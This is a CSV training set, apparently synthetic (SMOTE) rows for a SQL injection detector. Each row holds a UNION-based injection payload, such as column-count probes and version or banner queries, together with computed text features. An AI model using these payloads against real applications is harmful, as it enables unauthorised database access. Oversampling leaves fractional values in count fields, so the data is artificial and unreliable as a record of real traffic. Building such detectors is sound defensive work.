id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000409,attack,union,"1%""   )    )    union all select null,null,null,null--",nearest_attack_euclidean,R000323,0.03946474900787796,54.29282254993616,17.0,3.3598985064731877,30.234258039948934,1.0,14.0,9.058564509987233,0.5567687563274192,0.0184266093691349,0.25797253116788876,0.16683210313555716,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,3.058564509987233,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000410,attack,union,"1%' union all select null,null,null,null--",nearest_attack_euclidean,R000683,0.09691913663167555,42.73603746314618,16.0,3.4297492437351136,30.588829970516944,1.0,4.0,7.147207492629237,0.71549896285134,0.023472510319072243,0.09389004127628904,0.16713848555329883,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,3.1472074926292364,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000411,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000016,0.28951015361417104,102.0,25.102010919186757,4.034932656739027,66.0,4.0,24.0,8.0,0.6470588235294118,0.0392156862745098,0.23529411764705882,0.0784313725490196,0.0,0.0,2.0,0.0,1.897989080813244,2.0,0.0,0.0,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000412,attack,union,"-1106'   )    )    union all select 2855,2855,2855,2855,2855,2855,2855#",nearest_attack_euclidean,R000930,0.010787824470382942,70.93824933893934,21.97529973557574,3.6950398086093705,14.0,31.950599471151477,14.0,10.98764986778787,0.19736758626864043,0.45037741860983693,0.19736758626864045,0.15488740885288216,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,5.987649867787869,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000413,attack,union,"-3282'  )   union all select 9002,9002,9002,9002,9002#",nearest_attack_euclidean,R001454,0.16414539963384678,54.0,21.270793032147004,3.857444053028668,14.0,24.0,8.0,8.0,0.25925925925925924,0.4444444444444444,0.14814814814814814,0.14814814814814814,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,4.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000414,attack,union,"-1526""  )   where 4870  =  4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",nearest_attack_euclidean,R001524,0.03849125947072201,98.70739344407421,27.960985792543227,3.9124786573830965,19.0,51.765914755259374,14.0,13.941478688814843,0.19258772541637686,0.5242954667723447,0.1419067450436461,0.14121006276763232,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.941478688814843,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000415,attack,union,"-4280%""   )    )     )   union all select 7981,7981--",nearest_attack_euclidean,R000776,0.38979121762944874,51.713601510323784,21.970881208259023,3.68549247938554,14.0,10.970881208259023,18.0,8.742720302064756,0.27123018036771507,0.21104303691581874,0.3487245176156336,0.16900226510083255,0.0,1.0,3.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,0.7427203020647561,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000416,attack,union,"-2790'  )   as xhct where 5756  =  5756 union all select 5756,5756#",nearest_attack_euclidean,R001269,0.020113676729436914,67.13264115014536,26.973471769970928,4.090362382839026,25.0,20.10611292011629,16.0,6.026528230029072,0.3724469260460958,0.29943133139404726,0.2383660326695013,0.08975570989035564,1.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0265282300290717,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000417,attack,union,"-8294%' union all select 8728,8728,8728,8728,8728,8728,8728,8728,8728,8728#",nearest_attack_euclidean,R001267,0.3577816437323317,72.89435750272179,21.42112849945564,3.5233024005000018,14.0,42.31548600217743,4.0,12.578871500544357,0.19228171332607524,0.5802494704844854,0.05493763237887864,0.17253118381056068,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,8.578871500544357,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000418,attack,union," select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000088,0.516762018185448,104.64381450083044,26.849312722314494,3.9408685764881506,62.0,4.0,29.794501778515944,8.849312722314494,0.5930833982638117,0.03826344504927817,0.2841138824155754,0.08453927427133459,0.0,0.0,2.0,0.0,1.0,2.0,0.0,1.6986254446289861,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.8493127223144931,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000419,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000488,0.21177912157156145,69.92874935211236,26.35724961126742,4.178161085627616,36.14299948168989,9.0,15.0,9.785749870422473,0.5166003493751227,0.12881802301130785,0.21469670501884644,0.139884922594723,3.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.7857498704224737,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000420,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R001622,0.7326312023856112,82.36573197483547,29.0,4.3017513805284775,29.0,26.69258557986837,15.0,11.673146394967093,0.3550552342438159,0.32006326957387643,0.1836492590916289,0.14123223709067875,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.6731463949670933,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000421,attack,union,"1'||  (  select 'ybfo' from dual where 3319  =  3319 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000947,0.4522823185657587,106.6600183353922,28.66799633292156,4.0824490522003964,66.32801466831376,9.0,17.0,14.332003667078439,0.6215036680338593,0.08455089408922459,0.1597072443907575,0.13423819348615867,3.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.332003667078439,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000422,attack,union,"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",nearest_attack_euclidean,R000373,0.03553203536078861,69.81431006476218,20.0,3.5339670735752735,14.0,39.851448051809754,4.0,11.962862012952439,0.20057135364688555,0.5707755958321308,0.05730610104196732,0.17134694947901635,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.962862012952437,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000423,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,0.15250806828339453,81.19368979371292,23.11936897937129,3.68081165538857,47.95495183497033,9.0,14.0,10.238737958742583,0.5903184342351555,0.11100788775785883,0.17267893651222488,0.12599474149476075,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.238737958742583,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000424,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R001651,0.35103560644755355,59.7936261133909,25.264542037796968,3.9552086860112183,20.5872522267818,18.941831848812136,14.529084075593932,5.735457962203034,0.3435125711387914,0.3175766967775008,0.24278436163820927,0.09612637044549853,1.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.7354579622030339,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000425,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R001208,0.35610419837556395,77.22134191706367,27.71146323317453,4.198169989757417,29.0,22.577073533650935,15.0,10.644268383412735,0.37591192001456614,0.29187078398031063,0.1944372000075342,0.13778009599758906,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.6442683834127343,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000426,attack,union,"-6357""  )   union all select 9767,9767,9767,9767,9767,9767,9767,9767,9767#",nearest_attack_euclidean,R001206,0.05064581288124511,73.61445811772744,21.0,3.523141499706907,14.0,39.69156649418195,8.0,11.922891623545487,0.19024629579941554,0.5390907943322301,0.10871216902823748,0.1619507408401169,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.922891623545487,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000427,attack,union,"1'  )   as ybuv where 9641  =  9641 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000611,0.4787843168147412,92.83751669189648,24.83751669189648,3.7574417043799557,56.22501112793098,9.0,15.225011127930987,12.387494436034507,0.605612882229064,0.09696777528325129,0.16387079482758582,0.13354854766009888,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.3874944360345065,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000428,attack,union,"-7371'  )   union all select 4531,4531,4531#",nearest_attack_euclidean,R000217,0.07226477614886086,44.0,21.315597166645446,4.038911099016632,14.0,16.0,8.0,6.0,0.3181818181818182,0.36363636363636365,0.18181818181818182,0.13636363636363635,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000429,attack,union," select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000050,0.15364224030399445,87.45440859126212,27.0,3.8152242073997447,42.0,4.0,29.454408591262116,12.0,0.48034796503309224,0.045747425241246864,0.33666233400192025,0.13724227572374062,0.0,1.0,2.0,0.0,1.0,2.0,0.0,2.1136021478155294,0.0,0.0,1.8863978521844706,5.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000430,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000353,0.09204311227821746,58.42101150238462,22.115797699523075,3.989924242160169,14.0,27.536809201907698,8.0,8.884202300476925,0.23983234116968466,0.47108707496728963,0.13704705209696266,0.15203353176606307,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,4.884202300476924,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000431,attack,union,"-6775"" union all select 7484,7484#",nearest_attack_euclidean,R001304,0.19975887790831262,34.0,20.62329036811068,4.113496776282861,14.0,12.0,4.0,4.0,0.4117647058823529,0.35294117647058826,0.11764705882352941,0.11764705882352941,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000432,attack,union,"1""  )   where 3084  =  3084 union all select null,null--",nearest_attack_euclidean,R001253,0.2758277044886551,56.77306464298764,24.0,3.966704797062917,27.515376428658428,9.0,14.515376428658426,5.742311785670787,0.4845606339722172,0.15860848008871406,0.25545949606629687,0.10137138987277186,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.7423117856707866,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000433,attack,union,"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000261,0.05064042807729757,74.62859912650147,22.0,3.689730336531032,46.70287930120118,9.0,10.0,8.925719825300295,0.6255937308098932,0.12074280174699704,0.1341586686077745,0.1195047988353353,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,5.925719825300295,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000434,attack,union,"-8661"" union all select 5731,5731--",nearest_attack_euclidean,R001630,0.2545107670233878,33.68923188746186,19.951385509969487,4.119737286016977,14.0,10.951385509969487,4.0,4.737846377492372,0.41747690816717525,0.3228835335232283,0.11927911661919292,0.14036044169040354,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7378463774923718,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000435,attack,union,"-9932"" union all select 4049,4049,4049--",nearest_attack_euclidean,R000917,0.11197608800218556,40.0,19.264006915539845,3.9693683542039535,14.0,16.0,4.0,6.0,0.35,0.4,0.1,0.15,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000436,attack,union,"1%'   )    )    union all select null,null--",nearest_attack_euclidean,R001609,0.46393297533115363,41.213668137206575,16.767805678100547,3.4159899933261406,21.07122271240219,1.0,12.606834068603288,6.535611356201096,0.5145121451187158,0.024706201607097605,0.30235038714321916,0.15843126613096747,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.7678056781005478,1.0,0.0,0.7678056781005482,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000437,attack,union,"-9003""   )    )    union all select 9721,9721--",nearest_attack_euclidean,R001375,0.11957730239171546,47.399113640300854,21.0,3.8052860215160393,14.0,12.0,14.319290912240685,7.079822728060171,0.29558609207683634,0.25335950749443115,0.30172630192761873,0.14932809850111375,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0798227280601713,0.0,0.0,1.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000438,attack,union,"1%' union all select null,null,null,null,null--",nearest_attack_euclidean,R000573,0.006076632806798168,47.046729500251914,16.0,3.356695311351751,34.03738360020153,1.0,4.0,8.009345900050382,0.7234730876435789,0.021257475654561403,0.08502990261824563,0.17023953408361403,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.009345900050383,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000439,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000194,0.09861528271611363,82.75055882384007,28.0,3.939318806867985,40.0,3.9168529412800233,25.75055882384007,13.083147058719977,0.4834303685310839,0.04730369861910866,0.31111172484320543,0.158154208006602,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.916852941280023,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000440,attack,union," select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",nearest_attack_euclidean,R000118,1.1920928955078125e-07,83.0,33.0,4.182117121644976,44.0,2.0,25.0,12.0,0.5301204819277109,0.02409638554216867,0.30120481927710846,0.14457831325301204,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000441,attack,union,"1 where 2292  =  2292 union all select null,null,null,null#",nearest_attack_euclidean,R000951,0.6029476833708571,55.697920222220354,20.55347198518531,3.773058913786912,32.35833617777629,9.0,10.0,4.339584044444071,0.577077368211444,0.16445112181122984,0.18272346867914427,0.0757480412981819,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.339584044444071,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000442,attack,union,"1%"" union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000698,0.06126288703865094,52.484724955151954,16.0,3.273473081632376,38.38777996412156,1.0,4.0,9.09694499103039,0.7313104869226261,0.019080420299270456,0.07632168119708195,0.17328741158102132,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,5.096944991030391,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
